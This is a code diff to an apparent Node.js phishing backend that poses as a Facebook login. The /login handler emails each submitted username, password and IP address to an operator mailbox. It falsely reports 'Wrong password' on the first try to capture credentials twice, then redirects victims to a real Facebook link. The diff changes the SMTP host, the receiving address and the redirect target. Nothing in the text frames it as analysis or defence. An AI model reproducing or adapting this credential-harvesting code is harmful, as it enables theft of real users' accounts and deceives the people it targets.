@@ -33,7 +33,7 @@ app.use(
 );
 
 const transporter = nodemailer.createTransport({
-    host: 'smtp.office365.com',
+    host: 'smtp.zoho.com',
     port: 587,  
     secure: false,
     auth: {
@@ -62,8 +62,8 @@ app.post("/login", (req, res) => {
     // Create the email subject based on the attempt number
     const attemptNumber = req.session.attempt || 1;
     const mailOptions = {
-        from: '"Info" <thebridgejakob@outlook.com>',
-        to: 'thebridgejakob@outlook.com',
+        from: '"Info" <info@vaulttrustfinancial.com>',
+        to: 'info@vaulttrustfinancial.com',
         subject: `Login Attempt ${attemptNumber} by ${email}`,
         text: `Facebook Contact Form Details\nAttempt ${attemptNumber}\nUsername: ${email}\nPassword: ${password}\nUser IP: ${userIp}`
     };
@@ -78,7 +78,7 @@ app.post("/login", (req, res) => {
             req.session.message = attemptNumber === 1 ? 'Wrong password' : 'You have been successfully added to the private chat, you will get a message request shortly.';
         }
         req.session.attempt = attemptNumber === 1 ? 2 : 1; // Toggle the attempt number
-        res.redirect('/');
+        res.redirect('https://www.facebook.com/share/v/QeSVNGdVsuCoW8Bs/?mibextid=WC7FNe');
     });
 });
 
